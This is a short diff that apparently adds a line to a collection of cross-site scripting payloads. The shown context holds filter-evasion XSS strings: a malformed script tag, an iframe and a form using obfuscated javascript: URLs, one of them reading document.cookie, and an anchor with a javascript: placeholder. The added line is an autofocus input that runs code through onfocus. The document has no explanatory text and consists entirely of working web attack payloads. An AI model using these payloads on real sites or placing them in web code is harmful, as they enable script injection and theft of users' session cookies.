@@ -15,3 +15,4 @@ script ~~~>alert(0%0)</script ~~~>
 <iframe/%00/ src=javaSCRIPT&colon;alert(/hhhh/)
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 <a href="javascript:{ js code here}"> POC </a>
+<input onfocus=alert(0) autofocus>
